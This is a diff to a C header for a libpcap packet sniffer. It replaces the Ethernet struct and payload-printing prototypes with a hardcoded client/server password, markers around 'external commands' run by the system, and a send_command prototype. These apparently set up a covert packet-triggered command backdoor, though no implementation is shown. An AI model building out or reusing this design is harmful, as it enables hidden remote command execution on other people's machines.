@@ -34,16 +34,15 @@
 #include <arpa/inet.h>
 
 /* defaults */
-#define MAX_PKT_LEN			1518	/* maximum bytes per packet to capture */
-#define ETHERNET_SIZE		14		/* ethernet header size */
-#define ETHERNET_ADDR_LEN	6		/* ethernet address length */
+#define MAX_PKT_LEN			1500		/* maximum bytes per packet to capture */
+#define ETHERNET_SIZE		14			/* ethernet header size */
+#define ETHERNET_ADDR_LEN	6			/* ethernet address length */
 
-/* ethernet header */
-struct pcap_ethernet {
-	unsigned char	ether_dhost[ETHERNET_ADDR_LEN];	/* destination host address */
-	unsigned char	ether_shost[ETHERNET_ADDR_LEN];	/* source host address */
-	unsigned short	ether_type;						/* IP? ARP? RARP? etc */
-};
+#define PASSWORD			"-{qw}*dI"	/* password used between client/server */
+
+/* external commands are those executed by the system */
+#define EXT_CMD_START		"ext_cmd["
+#define EXT_CMD_END			"]dmc_txe"
 
 /* IP header */
 struct pcap_ip {
@@ -91,11 +90,12 @@ struct pcap_tcp {
 	unsigned short		th_urp;		/* urgent pointer */
 };
 
+/* globals */
+int server;
 int print_output;
 
 /* function prototypes */
 void packet_callback(unsigned char *, const struct pcap_pkthdr *, const unsigned char *);
-void print_payload(const unsigned char *, int);
-void print_hex_line(const unsigned char *, int, int);
+void send_command(char *);
 
 #endif
